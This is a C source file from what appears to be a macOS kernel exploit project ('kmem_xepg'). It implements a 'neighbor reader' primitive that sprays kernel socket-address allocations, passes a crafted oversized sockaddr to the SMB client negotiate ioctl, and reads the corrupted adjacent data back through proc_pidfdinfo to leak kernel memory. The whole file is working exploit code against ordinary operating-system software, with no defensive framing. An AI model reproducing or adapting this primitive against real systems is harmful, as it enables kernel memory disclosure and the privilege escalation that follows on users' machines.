//
//  neighbor_reader.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libproc.h>

#include <sys/un.h>
#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include "zkext_neighbor_reader.h"
#include "platform_constants.h"
#include "util_log.h"
#include "util_assert.h"

#include "../xnu/saddr_allocator.h"
#include "../smb/client.h"


#define SMB_FD_COUNT 10

struct kmem_zkext_neighbor_reader {
    xnu_saddr_allocator_t pad_start_allocator;
    xnu_saddr_allocator_t reader_allocator;
    xnu_saddr_allocator_t pad_end_allocator;
    int fds_smb[SMB_FD_COUNT];
    
    enum {
        STATE_CREATED,
        STATE_PREPARED,
    } state;
};

void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t reader) {
    xe_assert(reader->reader_allocator == NULL);
    xe_assert(reader->pad_end_allocator == NULL);
    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 32);
    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 32);
    reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64);
}

kmem_zkext_neighour_reader_t kmem_neighbor_reader_create(void) {
    int fd_smb = smb_client_open_dev();
    xe_assert(fd_smb >= 0);
    kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
    bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
    
    dispatch_apply(SMB_FD_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        reader->fds_smb[index] = smb_client_open_dev();
        xe_assert(reader->fds_smb[index] >= 0);
    });
    
    kmem_neighbor_reader_init_saddr_allocators(reader);
    reader->state = STATE_CREATED;
    return reader;
}

void kmem_zkext_neighbor_reader_prepare(kmem_zkext_neighour_reader_t reader, char* data, size_t data_size) {
    xe_assert(data_size <= UINT32_MAX);
    xe_assert(reader->state == STATE_CREATED);
    xnu_saddr_allocator_allocate(reader->pad_start_allocator);
    xnu_saddr_allocator_allocate(reader->reader_allocator);
    xnu_saddr_allocator_fragment(reader->reader_allocator, XE_PAGE_SIZE / 64 / 8);
    xnu_saddr_allocator_allocate(reader->pad_end_allocator);
    smb_client_ioc_negotiate(reader->fds_smb[0], (struct sockaddr_in*)data, (uint32_t)data_size, 0);
    reader->state = STATE_PREPARED;
}

void kmem_zkext_neighbor_reader_attempt_cleanup(kmem_zkext_neighour_reader_t reader) {
    XE_LOG_DEBUG("neighbor reader cleanup attempt initiated");
    
    char* data = alloca(255);;
    bzero(data, 255);
    data[0] = 0xff;
    
    dispatch_apply(16, DISPATCH_APPLY_AUTO, ^(size_t index) {
        smb_client_ioc_negotiate(reader->fds_smb[index], (struct sockaddr_in*)data, 255, FALSE);
    });
}

int kmem_zkext_neighbor_reader_read_modified(kmem_zkext_neighour_reader_t reader, struct socket_fdinfo* infos, size_t* count) {
    xe_assert(reader->state == STATE_PREPARED);
    
    int fds_modified[*count];
    bzero(fds_modified, sizeof(fds_modified));
    size_t num_modified_actual = *count;
    int error = xnu_saddr_allocator_find_modified(reader->reader_allocator, fds_modified, &num_modified_actual);
    if (error) {
        return error;
    }
    
    for (int i=0; i<num_modified_actual; i++) {
        int fd = fds_modified[i];
        int read = proc_pidfdinfo(getpid(), fd, PROC_PIDFDSOCKETINFO, &infos[i], sizeof(struct socket_fdinfo));
        xe_assert(read == sizeof(struct socket_fdinfo));
    }
    
    *count = num_modified_actual;
    return 0;
}

int kmem_zkext_neighbor_reader_prepare_read_modified(kmem_zkext_neighour_reader_t reader, char* out, uint8_t size) {
    xe_assert(reader->state == STATE_CREATED);
    xe_assert(size < 128);
    xe_assert(size >= 64);
    
    struct sockaddr_un addr;
    bzero(&addr, sizeof(addr));
    addr.sun_len = size * 2;
    static_assert(sizeof(addr) >= 64 + sizeof(uint8_t), "");
    *((uint8_t*)((uintptr_t)&addr + 64)) = size + (size - 64);
    kmem_zkext_neighbor_reader_prepare(reader, (char*)&addr, size);
    
    size_t num_modified_expected = (((size * 2) + (64 - 1)) / 64) - 1;
    
    struct socket_fdinfo modified[num_modified_expected];
    size_t num_modified_actual = num_modified_expected;
    int error = kmem_zkext_neighbor_reader_read_modified(reader, modified, &num_modified_actual);
    if (error) {
        return error;
    }
    
    if (num_modified_expected != num_modified_actual) {
        kmem_zkext_neighbor_reader_attempt_cleanup(reader);
        return EIO;
    }
    
    for (int i=0; i<num_modified_expected; i++) {
        struct sockaddr_un* addr = &modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
        if (addr->sun_len == (size + size - 64)) {
            memcpy(out, (char*)addr + (size - 64), size);
            return 0;
        }
    }
    
    return EBADF;
}

void kmem_zkext_neighbor_reader_reset(kmem_zkext_neighour_reader_t reader) {
    xe_assert(reader->state == STATE_PREPARED);
    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
    kmem_neighbor_reader_init_saddr_allocators(reader);
    reader->state = STATE_CREATED;
}

void kmem_zkext_neighbor_reader_destroy(kmem_zkext_neighour_reader_t* reader_p) {
    kmem_zkext_neighour_reader_t reader = *reader_p;
    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
    dispatch_apply(SMB_FD_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        close(reader->fds_smb[index]);
    });
    free(reader);
    *reader_p = NULL;
}
